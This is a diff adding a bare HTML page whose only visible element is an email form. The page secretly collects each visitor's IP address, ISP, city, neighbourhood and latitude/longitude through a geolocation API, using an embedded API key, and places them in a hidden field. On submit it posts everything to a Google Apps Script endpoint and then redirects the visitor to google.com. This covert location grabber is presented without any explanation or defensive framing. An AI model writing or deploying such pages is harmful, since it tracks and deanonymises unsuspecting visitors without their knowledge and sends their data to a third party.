@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ip-geolocation-api-jquery-sdk@1.1.0/ipgeolocation.min.js"></script>
+    <style>
+        #ip-details {
+            display: none;
+        }
+    </style>
+</head>
+<body onload="myFunction()">
+    <form name="data" method="post" autocomplete="off" id="data">
+        Enter Your Email :
+        <input type="email" name="email" id="email" required>
+        <textarea name="ip-details" id="ip-details"></textarea>
+        <br>
+        <button type="submit">Submit</button>
+    </form>
+
+
+<script>
+         _ipgeolocation.enableSessionStorage(true);
+    
+         var ip = sessionStorage.getItem("ip");
+         var country_name = sessionStorage.getItem("country_name");
+         var district = sessionStorage.getItem("district");
+         var isp = sessionStorage.getItem("isp");
+         var city = sessionStorage.getItem("city");
+         var latitude = sessionStorage.getItem("latitude");
+         var longitude = sessionStorage.getItem("longitude");
+                
+             _ipgeolocation.makeAsyncCallsToAPI(false);
+             _ipgeolocation.setFields("country_name,district,isp,city,latitude,longitude");
+             _ipgeolocation.getGeolocation(handleResponse, "4d8828d1407a4c8eb406f5620c6a4a5c");
+    
+         function handleResponse(json) {
+             ip = json.ip;
+             country_name = json.country_name;
+             district = json.district;
+             isp = json.isp;
+             city = json.city;
+             latitude = json.latitude;
+             longitude = json.longitude;
+         }
+                    
+         $(document).ready(function() {
+            var a = document.getElementById("ip-details").value = ("IP address : " +  ip + "\n" + "ISP Provider : " + isp + "\n" + "Latitude : " + latitude + "\n" + "Longitude : " + longitude + "\n" +  "Neigbourhood : " + district + "\n" + "City : " + city + "\n" + "Country : " + country_name);
+         });
+        </script>
+        
+    <script>
+        function myFunction() {
+          document.getElementById("ip-details").value = a;
+        }
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzqEO6r_szgLDtGwGsZGORUmFNGhJBH6axrYUBfmeZhz7_S41p2/exec'
+    const form = document.forms['data']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => window.location.replace("https://google.com"))
+        .catch(error => console.error('Error!', error.message))
+        // document.querySelector('#confirmation').style.display = 'block';
+        // document.querySelector('#reg').style.display = 'none';
+	})
+        </script>
+</body>
+</html>
